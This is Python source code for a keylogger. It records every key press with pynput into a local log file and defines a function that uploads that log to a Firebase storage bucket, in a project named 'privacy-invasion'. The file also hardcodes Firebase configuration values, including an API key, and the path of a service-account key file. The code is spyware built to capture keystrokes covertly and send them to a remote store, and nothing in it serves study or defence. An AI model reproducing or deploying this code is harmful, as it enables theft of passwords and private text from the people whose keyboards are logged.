from asyncio import sleep
from pynput.keyboard import Key, Listener
import logging
import pyrebase
import firebase_admin
from firebase_admin import credentials


cred = credentials.Certificate("D:\Key\serviceAccountKey.json")
firebase_admin.initialize_app(cred)
firebaseConfig = {
  "apiKey": "AIzaSyB-GLQMUralZbfu2WADESJgYseY0NpLNe0",
  "authDomain": "privacy-invasion.firebaseapp.com",
  "databaseURL": "https://privacy-invasion-default-rtdb.asia-southeast1.firebasedatabase.app",
  "projectId": "privacy-invasion",
  "storageBucket": "privacy-invasion.appspot.com",
  "messagingSenderId": "763429106519",
  "appId": "1:763429106519:web:904dd7364fcca152410412",
  "databaseURL":"https://privacy-invasion-default-rtdb.asia-southeast1.firebasedatabase.app/"
}
firebase=pyrebase.initialize_app(firebaseConfig)
storage=firebase.storage()
logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
def upload():
    storage.child("KeyLog").put("key_log.txt")
def on_press(key):
    
        logging.info('{0} pressed'.format(
        key))
        
        


def on_release(key):
    print('{0} release'.format(
        key))
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(
        on_press=on_press
        ) as listener:
    listener.join()
